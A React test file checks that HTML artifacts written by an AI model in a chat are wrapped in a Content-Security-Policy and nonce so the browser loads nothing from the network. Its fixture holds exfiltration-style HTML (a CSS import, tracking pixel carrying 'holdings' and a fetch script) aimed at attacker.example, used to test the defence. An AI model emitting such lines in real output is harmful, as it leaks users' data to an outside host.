import { render } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import Artifact from "~/components/AI/Artifact";
import {
  artifactContentSecurityPolicy,
  artifactNonce,
  withArtifactPolicy,
} from "~/components/AI/artifactPolicy";
import type { ArtifactT } from "~/lib/state/copilot";
import { mockConfig } from "../../../mocks/runtimeConfig";

describe("artifactContentSecurityPolicy", () => {
  it("allows nothing from the network: only what is written into the document", () => {
    const policy = artifactContentSecurityPolicy();
    expect(policy).toContain("default-src 'none'");
    expect(policy).toContain("img-src data:");
    expect(policy).toContain("font-src data:");
    expect(policy).toContain("style-src 'unsafe-inline'");
    expect(policy).toContain("form-action 'none'");
    expect(policy).toContain("base-uri 'none'");
    expect(policy).not.toMatch(/script-src/);
    expect(policy).not.toMatch(/https?:|\*|connect-src|frame-src/);
  });

  it("allows one script, the app's own, by its nonce", () => {
    expect(artifactContentSecurityPolicy("abc123")).toContain(
      "script-src 'nonce-abc123'",
    );
  });

  it("has a nonce that is different each time and not a short guess", () => {
    const nonces = new Set(Array.from({ length: 50 }, () => artifactNonce()));
    expect(nonces.size).toBe(50);
    for (const nonce of nonces) expect(nonce).toMatch(/^[0-9a-f]{32}$/);
  });
});

describe("withArtifactPolicy", () => {
  const policy = "default-src 'none'";
  const meta = `<meta http-equiv="Content-Security-Policy" content="${policy}">`;

  it("puts the policy first in the head, and the app's additions at the end of it", () => {
    const out = withArtifactPolicy(
      "<html><head><style>p{}</style></head><body>x</body></html>",
      policy,
      "<style>app{}</style>",
    );
    expect(out).toBe(
      `<html><head>${meta}<style>p{}</style><style>app{}</style></head><body>x</body></html>`,
    );
  });

  it("puts the policy first in a document without a head", () => {
    expect(withArtifactPolicy("<p>x</p>", policy, "<style>app{}</style>")).toBe(
      `${meta}<style>app{}</style><p>x</p>`,
    );
  });

  it("puts the additions after the policy when the head is never closed", () => {
    expect(withArtifactPolicy("<html><head><title>t</title>", policy, "<i></i>")).toBe(
      `<html><head>${meta}<i></i><title>t</title>`,
    );
  });
});

describe("an HTML artifact in the chat", () => {
  beforeEach(() => {
    mockConfig.data.allowHtmlJsExecution = false;
  });
  afterEach(() => {
    mockConfig.data.allowHtmlJsExecution = false;
  });

  const artifact: ArtifactT = {
    type: "html",
    uuid: "html-1",
    name: "Report",
    description: "A report",
    content:
      '<html><head><style>@import url("https://attacker.example/x.css");p{background:url(https://attacker.example/bg.png)}</style></head>' +
      '<body><p>Report</p><img src="https://attacker.example/pixel.png?d=holdings"><script>fetch("https://attacker.example")</script></body></html>',
  };

  const srcDocOf = (container: HTMLElement) =>
    container.querySelector("iframe")?.getAttribute("srcdoc") ?? "";

  it("carries a policy before anything the model wrote, so that the browser asks no server for anything", () => {
    const { container } = render(<Artifact artifact={artifact} inAiMessage />);
    const srcDoc = srcDocOf(container);
    const policyAt = srcDoc.indexOf("Content-Security-Policy");
    expect(policyAt).toBeGreaterThan(-1);
    expect(policyAt).toBeLessThan(srcDoc.indexOf("<style>"));
    expect(policyAt).toBeLessThan(srcDoc.indexOf("attacker.example"));
    expect(srcDoc).toContain("default-src 'none'");
    expect(srcDoc).not.toContain("<script");
    expect(srcDoc).not.toMatch(/script-src/);
  });

  it("lets the app's own script run and no other when scripts are on: the nonce is in the policy and on that script only", () => {
    mockConfig.data.allowHtmlJsExecution = true;
    const { container } = render(<Artifact artifact={artifact} inAiMessage />);
    const srcDoc = srcDocOf(container);
    const nonce = /script-src 'nonce-([0-9a-f]+)'/.exec(srcDoc)?.[1];
    expect(nonce).toBeDefined();
    const scripts = srcDoc.match(/<script\b[^>]*>/gi) ?? [];
    expect(scripts).toEqual([`<script nonce="${nonce}">`]);
    expect(srcDoc).not.toContain('fetch("https://attacker.example")');
  });

  it("gives each document its own nonce", () => {
    mockConfig.data.allowHtmlJsExecution = true;
    const first = srcDocOf(
      render(<Artifact artifact={artifact} inAiMessage />).container,
    );
    const second = srcDocOf(
      render(<Artifact artifact={{ ...artifact, uuid: "html-2" }} inAiMessage />)
        .container,
    );
    const nonceOf = (doc: string) => /nonce-([0-9a-f]+)/.exec(doc)?.[1];
    expect(nonceOf(first)).not.toBe(nonceOf(second));
  });
});
